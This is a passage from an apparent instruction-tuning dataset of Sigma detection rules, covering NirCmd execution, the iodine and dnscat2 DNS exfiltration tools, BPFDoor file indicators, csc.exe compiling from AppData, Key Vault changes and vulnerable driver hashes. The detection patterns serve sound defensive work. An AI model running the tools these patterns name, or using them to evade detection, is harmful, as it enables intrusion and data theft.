    "instruction": "Build a Sigma rule with the goal of detecting use of NirCmd tool for command execution, which could be the result of legitimate administrative activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity, you should: Monitor process creation logs on Windows systems for the execution of the NirCmd utility. This involves looking for instances where the process image name ends with '\\NirCmd.exe' or where the original filename is exactly 'NirCmd.exe'. In addition, inspect the command line for specific patterns. These include the presence of strings such as 'execmd', '.exe script', '.exe shexec', or 'runinteractive', which suggest the execution of commands or scripts. Additionally, monitor for combinations of command line parameters that include 'exec' or 'exec2' along with 'show' or 'hide', indicating attempts to run commands in a certain manner, possibly to evade detection. It's important to record the full command line and the parent command line during these checks. Be aware, however, that NirCmd is a legitimate tool that can be used by administrators for valid reasons, so carefully evaluate the context of its use to distinguish between malicious activity and legitimate administrative actions. This monitoring is set at a medium severity level due to the potential legitimate use of NirCmd.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium\n",
      "question": "use of NirCmd tool for command execution, which could be the result of legitimate administrative activity",
      "answer": "In order to detect the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity, you should: Monitor process creation logs on Windows systems for the execution of the NirCmd utility. This involves looking for instances where the process image name ends with '\\NirCmd.exe' or where the original filename is exactly 'NirCmd.exe'. In addition, inspect the command line for specific patterns. These include the presence of strings such as 'execmd', '.exe script', '.exe shexec', or 'runinteractive', which suggest the execution of commands or scripts. Additionally, monitor for combinations of command line parameters that include 'exec' or 'exec2' along with 'show' or 'hide', indicating attempts to run commands in a certain manner, possibly to evade detection. It's important to record the full command line and the parent command line during these checks. Be aware, however, that NirCmd is a legitimate tool that can be used by administrators for valid reasons, so carefully evaluate the context of its use to distinguish between malicious activity and legitimate administrative actions. This monitoring is set at a medium severity level due to the potential legitimate use of NirCmd."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Well-known DNS Exfiltration tools execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of well-known DNS Exfiltration tools, you should focus on monitoring the process creation logs within Windows systems. Specifically, look out for any process executions where the image path ends with '\\iodine.exe' or contains '\\dnscat2'. Such indicators are strong signs of DNS-based data exfiltration attempts using known tools like Iodine and Dnscat2, which are often used by attackers to stealthily extract data from compromised networks. The likelihood of these activities being benign is very low, hence they are marked with a high severity level. Identifying these activities promptly can help in mitigating potential data loss through DNS queries.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "Well-known DNS Exfiltration tools execution",
      "answer": "In order to detect the execution of well-known DNS Exfiltration tools, you should focus on monitoring the process creation logs within Windows systems. Specifically, look out for any process executions where the image path ends with '\\iodine.exe' or contains '\\dnscat2'. Such indicators are strong signs of DNS-based data exfiltration attempts using known tools like Iodine and Dnscat2, which are often used by attackers to stealthily extract data from compromised networks. The likelihood of these activities being benign is very low, hence they are marked with a high severity level. Identifying these activities promptly can help in mitigating potential data loss through DNS queries."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy, you should: focus on observing process creation events within Windows environments. Specifically, watch for processes that end with '\\gpscript.exe' or have the original file name 'GPSCRIPT.EXE'. These processes are particular interest if they are initiated with a command line that includes ' /logon' or ' /startup', indicating they are being used to execute logon or startup scripts as configured in a Group Policy. However, it's crucial to filter out and not raise alerts if these processes stem from the parent command line 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc', as this is a legitimate use case associated with the main service host process for networking services. Be aware, though, that there could be legitimate uses of logon scripts distributed via group policy, which could lead to potential false positives. The level of concern for such detections is considered medium, underscoring the need for careful analysis of detected events to distinguish between malicious use and legitimate administrative activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\gpscript.exe'\n        - OriginalFileName: 'GPSCRIPT.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ' /logon'\n            - ' /startup'\n    filter_main_svchost:\n        ParentCommandLine: 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate uses of logon scripts distributed via group policy\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\gpscript.exe'\n        - OriginalFileName: 'GPSCRIPT.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ' /logon'\n            - ' /startup'\n    filter_main_svchost:\n        ParentCommandLine: 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate uses of logon scripts distributed via group policy\nlevel: medium\n",
      "question": "execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy",
      "answer": "In order to detect the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy, you should: focus on observing process creation events within Windows environments. Specifically, watch for processes that end with '\\gpscript.exe' or have the original file name 'GPSCRIPT.EXE'. These processes are particular interest if they are initiated with a command line that includes ' /logon' or ' /startup', indicating they are being used to execute logon or startup scripts as configured in a Group Policy. However, it's crucial to filter out and not raise alerts if these processes stem from the parent command line 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc', as this is a legitimate use case associated with the main service host process for networking services. Be aware, though, that there could be legitimate uses of logon scripts distributed via group policy, which could lead to potential false positives. The level of concern for such detections is considered medium, underscoring the need for careful analysis of detected events to distinguish between malicious use and legitimate administrative activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting detects BPFDoor .lock and .pid files access in temporary file storage facility.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detects BPFDoor .lock and .pid files access in temporary file storage facility, you should: Focus on monitoring Linux systems, specifically through the auditd service. The detection criteria are centered on the access of specific file paths, namely /var/run/haldrund.pid, /var/run/xinetd.lock, and /var/run/kdevrund.pid. These files are significant because their access might indicate the manipulation or monitoring by BPFDoor, a known malicious activity. This activity typically involves the use of temporary file storage facilities for .lock and .pid files, which are critical in the context of Linux system operations. The detection of any interactions with these specific files\u2014in this context, having the file type 'PATH'\u2014should be treated with high suspicion, as there are few legitimate reasons for such files to be accessed in a normal operational framework. False positives are considered unlikely, emphasizing the importance of closely monitoring and investigating any hits against these criteria. This approach is crucial in identifying potential security breaches or unauthorized activities related to BPFDoor's mechanisms. The tags relevant to this kind of detection would include tactics and techniques like Execution, Persistence, and Privilege Escalation, though they are not explicitly mentioned in the provided information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'PATH'\n        name:\n            - /var/run/haldrund.pid\n            - /var/run/xinetd.lock\n            - /var/run/kdevrund.pid\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'PATH'\n        name:\n            - /var/run/haldrund.pid\n            - /var/run/xinetd.lock\n            - /var/run/kdevrund.pid\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "detects BPFDoor .lock and .pid files access in temporary file storage facility",
      "answer": "In order to detects BPFDoor .lock and .pid files access in temporary file storage facility, you should: Focus on monitoring Linux systems, specifically through the auditd service. The detection criteria are centered on the access of specific file paths, namely /var/run/haldrund.pid, /var/run/xinetd.lock, and /var/run/kdevrund.pid. These files are significant because their access might indicate the manipulation or monitoring by BPFDoor, a known malicious activity. This activity typically involves the use of temporary file storage facilities for .lock and .pid files, which are critical in the context of Linux system operations. The detection of any interactions with these specific files\u2014in this context, having the file type 'PATH'\u2014should be treated with high suspicion, as there are few legitimate reasons for such files to be accessed in a normal operational framework. False positives are considered unlikely, emphasizing the importance of closely monitoring and investigating any hits against these criteria. This approach is crucial in identifying potential security breaches or unauthorized activities related to BPFDoor's mechanisms. The tags relevant to this kind of detection would include tactics and techniques like Execution, Persistence, and Privilege Escalation, though they are not explicitly mentioned in the provided information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g., AppData), you should monitor for the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\csc.exe'. This indicates the use of the Microsoft C# Compiler, which could be utilized by an attacker to compile malicious code on the fly. Attention should be given to command lines that contain paths pointing to potentially suspicious folders such as '\\AppData\\' and '\\Windows\\Temp\\', which are commonly used by malware to execute or store payloads due to their less restrictive permissions and general oversight.\n\nHowever, it's also paramount to apply certain filters to reduce false-positive alerts. Processes spawned from 'C:\\Program Files' are typically considered safe, thus any process creation with a parent image starting with this path might be excluded from alerts. Similarly, parent images that end with '\\sdiagnhost.exe', '\\w3wp.exe', or '\\choco.exe', as well as processes initiated with command lines containing '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection', should also be deemed as potentially legitimate activities and excluded from being flagged as suspicious. These filters are crucial for focusing on truly malicious activities and mitigating the noise from legitimate software operations within these directories.\n\nThis approach emphasizes the importance of scrutinizing process creation events where 'csc.exe' is employed in conjunction with questionable directories, while also considering the context of the parent process to distinguish between malicious use and legitimate software activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csc.exe'\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Windows\\Temp\\'\n    filter:\n        - ParentImage|startswith: 'C:\\Program Files'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n        - ParentImage|endswith:\n            - '\\sdiagnhost.exe'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '\\w3wp.exe'        # https://twitter.com/gabriele_pippi/status/1206907900268072962\n            - '\\choco.exe'       # Chocolatey https://chocolatey.org/\n        - ParentCommandLine|contains: '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate software from program files - https://twitter.com/gN3mes1s/status/1206874118282448897\n    - Legitimate Microsoft software - https://twitter.com/gabriele_pippi/status/1206907900268072962\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csc.exe'\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Windows\\Temp\\'\n    filter:\n        - ParentImage|startswith: 'C:\\Program Files'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n        - ParentImage|endswith:\n            - '\\sdiagnhost.exe'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '\\w3wp.exe'        # https://twitter.com/gabriele_pippi/status/1206907900268072962\n            - '\\choco.exe'       # Chocolatey https://chocolatey.org/\n        - ParentCommandLine|contains: '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate software from program files - https://twitter.com/gN3mes1s/status/1206874118282448897\n    - Legitimate Microsoft software - https://twitter.com/gabriele_pippi/status/1206907900268072962\nlevel: medium\n",
      "question": "suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)",
      "answer": "In order to detect a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g., AppData), you should monitor for the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\csc.exe'. This indicates the use of the Microsoft C# Compiler, which could be utilized by an attacker to compile malicious code on the fly. Attention should be given to command lines that contain paths pointing to potentially suspicious folders such as '\\AppData\\' and '\\Windows\\Temp\\', which are commonly used by malware to execute or store payloads due to their less restrictive permissions and general oversight.\n\nHowever, it's also paramount to apply certain filters to reduce false-positive alerts. Processes spawned from 'C:\\Program Files' are typically considered safe, thus any process creation with a parent image starting with this path might be excluded from alerts. Similarly, parent images that end with '\\sdiagnhost.exe', '\\w3wp.exe', or '\\choco.exe', as well as processes initiated with command lines containing '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection', should also be deemed as potentially legitimate activities and excluded from being flagged as suspicious. These filters are crucial for focusing on truly malicious activities and mitigating the noise from legitimate software operations within these directories.\n\nThis approach emphasizes the importance of scrutinizing process creation events where 'csc.exe' is employed in conjunction with questionable directories, while also considering the context of the parent process to distinguish between malicious use and legitimate software activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting key vault is modified or deleted..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when a key vault is modified or deleted, you should: Monitor Azure Activity Logs for operations indicating changes to Key Vaults. Specifically, look for events where the operation name is one of the following: `MICROSOFT.KEYVAULT/VAULTS/WRITE`, `MICROSOFT.KEYVAULT/VAULTS/DELETE`, `MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION`, or `MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE`. These activities suggest that a Key Vault is either being written to, deleted, deployed, or its access policies are being modified. While detecting these operations can signal potentially malicious actions, it's also important to consider legitimate administrative activities. False positives may occur, such as when a system administrator is performing expected maintenance or updates. In such cases, verify the actions by cross-referencing the user identity, user agent, and hostname involved in making these changes. Should these modifications originate from unfamiliar users or systems, further investigation is warranted. Known behaviors that lead to false positives should be documented and adjusted in monitoring strategies to avoid unnecessary alerts. By implementing these monitoring strategies, organizations can enhance their security posture by ensuring that modifications to key vaults are authorized and traceable, maintaining the integrity and confidentiality of their stored secrets.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.KEYVAULT/VAULTS/WRITE\n            - MICROSOFT.KEYVAULT/VAULTS/DELETE\n            - MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION\n            - MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE\n    condition: selection\nfalsepositives:\n    - Key Vault being modified or deleted may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Key Vault modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.KEYVAULT/VAULTS/WRITE\n            - MICROSOFT.KEYVAULT/VAULTS/DELETE\n            - MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION\n            - MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE\n    condition: selection\nfalsepositives:\n    - Key Vault being modified or deleted may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Key Vault modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "key vault is modified or deleted.",
      "answer": "In order to identify when a key vault is modified or deleted, you should: Monitor Azure Activity Logs for operations indicating changes to Key Vaults. Specifically, look for events where the operation name is one of the following: `MICROSOFT.KEYVAULT/VAULTS/WRITE`, `MICROSOFT.KEYVAULT/VAULTS/DELETE`, `MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION`, or `MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE`. These activities suggest that a Key Vault is either being written to, deleted, deployed, or its access policies are being modified. While detecting these operations can signal potentially malicious actions, it's also important to consider legitimate administrative activities. False positives may occur, such as when a system administrator is performing expected maintenance or updates. In such cases, verify the actions by cross-referencing the user identity, user agent, and hostname involved in making these changes. Should these modifications originate from unfamiliar users or systems, further investigation is warranted. Known behaviors that lead to false positives should be documented and adjusted in monitoring strategies to avoid unnecessary alerts. By implementing these monitoring strategies, organizations can enhance their security posture by ensuring that modifications to key vaults are authorized and traceable, maintaining the integrity and confidentiality of their stored secrets."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the builtin \"del\"/\"erase\" commands in order to delete files since adversaries may delete files left behind by the actions of their intrusion activity, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the initiation of the command prompt executable 'cmd.exe', identified either through the image path ending with '\\cmd.exe' or the original file name being 'Cmd.Exe'. Once command prompt activity is identified, further inspect if any command lines include the use of 'del ' or 'erase ' commands which are known to delete files. Additionally, pay special attention to command lines that contain flags like ' /f' indicating the forced deletion of read-only files, ' /s' for the deletion of specified files from all subdirectories, and ' /q' for quiet mode operation where no confirmation is asked when deleting files globally. This form of monitoring helps in identifying the malicious deletion of files which could be part of an adversary's efforts to minimize their footprint and hide their activities following an intrusion. Be aware, however, that the level of false positives can vary, and it might be necessary to further refine detection by considering additional context such as the parent image of the process or specific command line patterns deemed legitimate within your environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains:\n            - ' /f' # Force deleting of read-only files.\n            - ' /s' # Delete specified files from all subdirectories.\n            - ' /q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains:\n            - ' /f' # Force deleting of read-only files.\n            - ' /s' # Delete specified files from all subdirectories.\n            - ' /q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n",
      "question": "execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n",
      "answer": "In order to detect execution of the builtin \"del\"/\"erase\" commands in order to delete files since adversaries may delete files left behind by the actions of their intrusion activity, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the initiation of the command prompt executable 'cmd.exe', identified either through the image path ending with '\\cmd.exe' or the original file name being 'Cmd.Exe'. Once command prompt activity is identified, further inspect if any command lines include the use of 'del ' or 'erase ' commands which are known to delete files. Additionally, pay special attention to command lines that contain flags like ' /f' indicating the forced deletion of read-only files, ' /s' for the deletion of specified files from all subdirectories, and ' /q' for quiet mode operation where no confirmation is asked when deleting files globally. This form of monitoring helps in identifying the malicious deletion of files which could be part of an adversary's efforts to minimize their footprint and hide their activities following an intrusion. Be aware, however, that the level of false positives can vary, and it might be necessary to further refine detection by considering additional context such as the parent image of the process or specific command line patterns deemed legitimate within your environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of AppX packages with known suspicious or malicious signature.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of AppX packages with known suspicious or malicious signature, you should monitor Windows application packaging logs for specific events related to the installation or execution of AppX packages. Focus your attention on events with the ID 157 within the AppX packaging service logs. This particular event ID indicates the activation of an AppX package, which could potentially be harmful if it originates from untrusted sources. Specifically, lookout for packages signed by the certificate with a subject name of \"CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\". This certificate has been identified as suspicious or malicious based on its usage in various attacks. It is crucial to be aware that there might be instances where this detection could trigger false positives, although the circumstances under which these might occur are unknown. The severity level for this detection has been set to medium, indicating a balanced caution between overlooking potential threats and overreacting to benign activities. This detection is aligned with techniques identified by MITRE ATT&CK relating to the abuse of application deployment systems for the purpose of executing untrusted code.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: appxpackaging-om\ndetection:\n    selection:\n        EventID: 157\n        # Add more known suspicious/malicious certificates used in different attacks\n        subjectName: 'CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: appxpackaging-om\ndetection:\n    selection:\n        EventID: 157\n        # Add more known suspicious/malicious certificates used in different attacks\n        subjectName: 'CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of AppX packages with known suspicious or malicious signature",
      "answer": "In order to detect execution of AppX packages with known suspicious or malicious signature, you should monitor Windows application packaging logs for specific events related to the installation or execution of AppX packages. Focus your attention on events with the ID 157 within the AppX packaging service logs. This particular event ID indicates the activation of an AppX package, which could potentially be harmful if it originates from untrusted sources. Specifically, lookout for packages signed by the certificate with a subject name of \"CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\". This certificate has been identified as suspicious or malicious based on its usage in various attacks. It is crucial to be aware that there might be instances where this detection could trigger false positives, although the circumstances under which these might occur are unknown. The severity level for this detection has been set to medium, indicating a balanced caution between overlooking potential threats and overreacting to benign activities. This detection is aligned with techniques identified by MITRE ATT&CK relating to the abuse of application deployment systems for the purpose of executing untrusted code."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting load of a signed and vulnerable GIGABYTE driver often used by threat actors or malware for privilege escalation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the load of a signed and vulnerable GIGABYTE driver often used by threat actors or malware for privilege escalation, you should monitor for specific driver loads on Windows systems. This involves tracking the loading of drivers using their hash values to identify potentially malicious activities. The hash values include specific MD5, SHA1, and SHA256 hashes that have been associated with the GIGABYTE driver in question. The detection process is primarily based on Sysmon events related to driver loads, but it also covers other unspecified logging mechanisms that could capture driver loading activities. This approach is aimed at identifying instances where this vulnerable driver might be exploited by attackers to gain elevated privileges on a system. Identifying such events is critical as they are indicative of possible system compromise or an ongoing attack. The severity level for these detections is categorized as high, signaling the importance of promptly addressing any matches found during monitoring.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection_sysmon:\n        Hashes|contains:\n            - 'MD5=9AB9F3B75A2EB87FAFB1B7361BE9DFB3'\n            - 'MD5=C832A4313FF082258240B61B88EFA025'\n            - 'SHA1=FE10018AF723986DB50701C8532DF5ED98B17C39'\n            - 'SHA1=1F1CE28C10453ACBC9D3844B4604C59C0AB0AD46'\n            - 'SHA256=31F4CFB4C71DA44120752721103A16512444C13C2AC2D857A7E6F13CB679B427'\n            - 'SHA256=CFC5C585DD4E592DD1A08887DED28B92D9A5820587B6F4F8FA4F56D60289259B'\n    selection_other:\n        - md5:\n            - '9ab9f3b75a2eb87fafb1b7361be9dfb3'\n            - 'c832a4313ff082258240b61b88efa025'\n        - sha1:\n            - 'fe10018af723986db50701c8532df5ed98b17c39'\n            - '1f1ce28c10453acbc9d3844b4604c59c0ab0ad46'\n        - sha256:\n            - '31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427'\n            - 'cfc5c585dd4e592dd1a08887ded28b92d9a5820587b6f4f8fa4f56d60289259b'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection_sysmon:\n        Hashes|contains:\n            - 'MD5=9AB9F3B75A2EB87FAFB1B7361BE9DFB3'\n            - 'MD5=C832A4313FF082258240B61B88EFA025'\n            - 'SHA1=FE10018AF723986DB50701C8532DF5ED98B17C39'\n            - 'SHA1=1F1CE28C10453ACBC9D3844B4604C59C0AB0AD46'\n            - 'SHA256=31F4CFB4C71DA44120752721103A16512444C13C2AC2D857A7E6F13CB679B427'\n            - 'SHA256=CFC5C585DD4E592DD1A08887DED28B92D9A5820587B6F4F8FA4F56D60289259B'\n    selection_other:\n        - md5:\n            - '9ab9f3b75a2eb87fafb1b7361be9dfb3'\n            - 'c832a4313ff082258240b61b88efa025'\n        - sha1:\n            - 'fe10018af723986db50701c8532df5ed98b17c39'\n            - '1f1ce28c10453acbc9d3844b4604c59c0ab0ad46'\n        - sha256:\n            - '31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427'\n            - 'cfc5c585dd4e592dd1a08887ded28b92d9a5820587b6f4f8fa4f56d60289259b'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "load of a signed and vulnerable GIGABYTE driver often used by threat actors or malware for privilege escalation",
      "answer": "In order to detect the load of a signed and vulnerable GIGABYTE driver often used by threat actors or malware for privilege escalation, you should monitor for specific driver loads on Windows systems. This involves tracking the loading of drivers using their hash values to identify potentially malicious activities. The hash values include specific MD5, SHA1, and SHA256 hashes that have been associated with the GIGABYTE driver in question. The detection process is primarily based on Sysmon events related to driver loads, but it also covers other unspecified logging mechanisms that could capture driver loading activities. This approach is aimed at identifying instances where this vulnerable driver might be exploited by attackers to gain elevated privileges on a system. Identifying such events is critical as they are indicative of possible system compromise or an ongoing attack. The severity level for these detections is categorized as high, signaling the importance of promptly addressing any matches found during monitoring."
    }
  },
  {
